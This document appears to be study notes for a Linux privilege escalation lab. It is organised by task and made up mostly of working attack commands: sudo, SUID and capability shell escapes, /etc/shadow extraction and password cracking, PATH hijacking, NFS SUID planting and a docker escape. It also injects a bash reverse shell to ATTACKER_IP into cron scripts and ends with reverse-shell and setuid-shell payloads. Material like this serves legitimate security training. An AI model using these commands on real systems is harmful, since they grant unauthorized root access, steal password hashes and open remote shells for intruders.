# Linux Privilege Escalation

---

## TASK 3: Enumeration

### Host Information:
- `hostname` - Return the hostname of the target machine but can easily be changed.
- `uname -a` - Print system information giving us additional detail about the kernel used by the system, useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.
- `cat /proc/version` - Show kernel version and compiler info.
- `cat /etc/issue` - Contains some information about the operating system but can easily be changed.
- `cat /etc/os-release` - Detailed OS information.

### Process Information:
- `ps -A` - View all running processes.
- `ps axjf` - View process tree.
- `ps aux` - Show processes for all users with details.
- `top` - Interactive process viewer.

### System Environment:
- `env` - The `env` command will show environmental variables. The PATH variable may have a compiler or a scripting language (e.g., Python) that could be used to run code on the target system or leveraged for privilege escalation.
- `echo $PATH` - Display PATH variable.
- `sudo -l` - List commands user can run with sudo.
- `id` - Show user and group information.

### User Information:
- `cat /etc/passwd` - List all users.
- `cat /etc/shadow` - User password hashes (root access needed).
- `whoami` - Current username.
- `last` - Show last logged in users.

### Network Information:
- `ifconfig` - Network interface information.
- `ip route` - Display network routes.
- `netstat -a` - All listening ports and connections.
- `netstat -at` - All TCP ports.
- `netstat -l` - Listening ports only.

### File System:
- `find /home -name flag1.txt 2>/dev/null` - Find the file named `flag1.txt` in home directory.
- `grep -r "flag" /home /var/www 2>/dev/null` - Search for text in files.
- `history` - Command history.

---

## TASK 5: Kernel Exploits

### Kernel Vulnerability Assessment:
- `uname -a` - Check kernel version.
- `cat /proc/version` - Detailed kernel information.

### Exploitation Process:
1. Identify kernel version and architecture.
2. Search for exploits on Exploit-DB, GitHub, or other databases.
3. Download/compile exploit on attacker machine.
4. Transfer to target system.
5. Compile and execute exploit.

### Example Commands:
- Search for kernel exploits: `searchsploit "Linux Kernel 3.13"`
- Compile and run exploit:
  ```bash
  gcc exploit.c -o exploit
  chmod +x exploit
  ./exploit
  ```

### Common Kernel Exploits:
- DirtyCow (CVE-2016-5195)
- overlayfs (CVE-2015-1328)
- uselib (CVE-2021-4034)

---

## TASK 6: Sudo

### Sudo Permission Check:
- `sudo -l` - List all sudo permissions.

### Common Sudo Exploits:
- If user can run any command as root:
  ```bash
  sudo su
  sudo -i
  ```
- If specific binaries are allowed:
  ```bash
  sudo /bin/bash
  sudo /bin/sh
  ```

### GTFOBins Method:
Visit [GTFOBins](https://gtfobins.github.io/) for specific binary exploitation.
Example for `nano`:
```bash
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

### Common Sudo Vulnerabilities:
- Python:
  ```bash
  sudo python -c 'import os; os.system("/bin/bash")'
  ```
- Find:
  ```bash
  sudo find / -exec /bin/bash \;
  ```
- More:
  ```bash
  sudo more /etc/hosts
  !/bin/bash
  ```

---

## TASK 7: SUID

### Finding SUID/SGID Files:
- `find / -type f -perm -04000 -ls 2>/dev/null` - SUID files.
- `find / -type f -perm -02000 -ls 2>/dev/null` - SGID files.
- `find / -perm -u=s -type f 2>/dev/null` - Alternative SUID search.

### Common Exploitable SUID Binaries:
- Base64 - Read files:
  ```bash
  base64 "/etc/shadow" | base64 --decode
  ```
- Find - Execute commands:
  ```bash
  find . -exec /bin/bash -p \;
  ```
- Nano/Vim - File editing:
  ```bash
  nano /etc/passwd
  ```
- Bash - Spawn shell:
  ```bash
  bash -p
  ```

### GTFOBins SUID Exploitation:
Check [GTFOBins](https://gtfobins.github.io/) for SUID exploitation techniques.
Example for `base64`:
```bash
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
```

---

## TASK 8: Capabilities

### Finding Capabilities:
- `getcap -r / 2>/dev/null` - Recursive capability search.

### Common Capability Exploits:
- If Python has `cap_setuid`:
  ```bash
  /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```
- Perl with capabilities:
  ```bash
  perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
  ```

### Exploitable Capabilities:
- `cap_setuid+ep` - Can set UID.
- `cap_dac_read_search+ep` - Can bypass file read permissions.
- `cap_dac_override+ep` - Can bypass file write permissions.

---

## TASK 9: Cronjob

### Finding Cron Jobs:
- `cat /etc/crontab` - System cron jobs.
- `crontab -l` - User cron jobs.
- `ls -la /etc/cron.*` - Cron directories.
- `cat /etc/cron.d/*` - Cron.d files.

### Cron Job Exploitation:
- If writable cron script:
  ```bash
  echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /path/to/cron/script
  ```
- Start listener on attacker:
  ```bash
  nc -lvnp PORT
  ```

### Common Cron Vulnerabilities:
- Writable cron scripts.
- Wildcard in cron commands.
- PATH manipulation in cron.

### Wildcard Cron Exploitation:
- If cron uses wildcards like `*`:
  ```bash
  echo '#!/bin/bash' > /tmp/exploit.sh
  echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /tmp/exploit.sh
  chmod +x /tmp/exploit.sh
  ```

---

## TASK 10: PATH

### PATH Environment Manipulation:
- `echo $PATH` - Check current PATH.
- `export PATH=/tmp:$PATH` - Prepend writable directory.

### PATH Hijacking Example:
- Find writable directories:
  ```bash
  find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
  ```
- Create malicious binary:
  ```bash
  echo -e '#include <unistd.h>\nint main() {\nsetgid(0);\nsetuid(0);\nsystem("/bin/bash");\n}' > /tmp/thm.c
  gcc /tmp/thm.c -o /tmp/thm
  chmod 777 /tmp/thm
  export PATH=/tmp:$PATH
  ```

---

## TASK 11: NFS Privilege Escalation

### NFS Configuration Check:
- `cat /etc/exports` - NFS export configurations.

### NFS Exploitation:
- On attacker machine:
  ```bash
  showmount -e TARGET_IP
  ```
- Mount NFS share:
  ```bash
  mkdir /tmp/nfs
  mount -o rw,vers=2 TARGET_IP:/share /tmp/nfs
  ```
- Create SUID binary:
  ```bash
  cd /tmp/nfs
  gcc -o shell shell.c
  chmod +s shell
  ```

---

## TASK 12: Capstone Challenge

### Flag1:
- Decode shadow file:
  ```bash
  base64 "/etc/shadow" | base64 --decode
  ```
- Crack password:
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
  ```
- Login as `missy` then read `flag1.txt`.

### Flag2:
- Decode root flag:
  ```bash
  base64 "/home/rootflag/flag2.txt" | base64 --decode
  ```

---

## TASK 13: Additional Exploitation Techniques

### Password Cracking:
- Extract hashes from `/etc/shadow`:
  ```bash
  unshadow passwd shadow > hashes.txt
  ```
- Crack with John:
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  ```

### SSH Key Abuse:
- Look for SSH keys:
  ```bash
  find / -name id_rsa 2>/dev/null
  find / -name *.pem 2>/dev/null
  ```
- Use found keys:
  ```bash
  chmod 600 key.pem
  ssh -i key.pem user@target
  ```

### Docker Privilege Escalation:
- Check if in docker container:
  ```bash
  cat /proc/1/cgroup | grep docker
  ```
- If user in docker group:
  ```bash
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  ```

---

## TASK 14: Tools of Trade

### Automated Enumeration Tools:

#### LinPEAS:
- Download and run:
  ```bash
  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh > linpeas_output.txt
  ```

#### LinEnum:
- Common Linux enumeration script:
  ```bash
  ./LinEnum.sh -t > linenum_report.txt
  ```

#### Linux Exploit Suggester:
- Check for potential exploits:
  ```bash
  ./les.sh -k `uname -r`
  ```

#### Unix Privesc Check:
- Comprehensive privilege escalation checker:
  ```bash
  python unix-privesc-check standard
  ```

#### Metasploit:
- If you have meterpreter session:
  ```bash
  use post/multi/recon/local_exploit_suggester
  set session 1
  run
  ```

---

## Appendix

### Critical Files:
- `/etc/passwd` - User account information.
- `/etc/shadow` - User password hashes.
- `/etc/sudoers` - Sudo configuration.
- `/etc/crontab` - System cron jobs.
- `/etc/exports` - NFS exports.

### Important Directories:
- `/home/*` - User home directories.
- `/tmp` - Temporary files (often writable).
- `/var/log` - Log files.
- `/var/www` - Web root directories.

### Useful Commands:
- Find SUID files:
  ```bash
  find / -perm -4000 2>/dev/null
  ```
- Find writable directories:
  ```bash
  find / -writable -type d 2>/dev/null
  ```
- List user cron jobs:
  ```bash
  crontab -l
  ```
- Find capabilities:
  ```bash
  getcap -r / 2>/dev/null
  ```

### Common Payloads:
- Reverse shell:
  ```bash
  bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
  ```
- SUID shell:
  ```c
  int main() { setgid(0); setuid(0); system("/bin/bash"); }
  ```